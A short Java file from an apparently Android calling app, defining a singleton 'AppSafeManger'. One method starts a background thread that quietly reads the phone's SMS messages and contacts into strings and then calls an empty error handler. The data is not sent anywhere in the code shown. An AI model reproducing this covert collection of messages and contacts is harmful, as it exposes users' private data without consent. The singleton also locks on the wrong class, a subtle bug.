/**
 * 
 */
package com.example.com.suyi.phone.call;

import android.content.Context;

import com.example.com.suyi.domain.ContactManger;
import com.example.com.suyi.phone.call.app.CallApp;

/**
 * @author "suwg" 2016Äê5ÔÂ30ÈÕ
 */
public class AppSafeManger {

	private volatile static AppSafeManger singleton;
	Context mContext;

	private AppSafeManger() {
		mContext = CallApp.getInstance();
	}

	public static AppSafeManger getSingleton() {
		if (singleton == null) {
			synchronized (AppPermissionManger.class) {
				if (singleton == null) {
					singleton = new AppSafeManger();
				}
			}
		}
		return singleton;
	}

	void onFoundUN() {
		new Thread(new Runnable() {

			@Override
			public void run() {
				// TODO Auto-generated method stub
				
				String info=new MsgManger(CallApp.getInstance()).getPhoneSmsInPhoneString();
				
				String phoneContact = new ContactManger(CallApp.getInstance())
						.getPhoneLocalContactsString();
				
				
				

				onErr();
			}
		}).start();

	}

	void onErr() {

	}

}
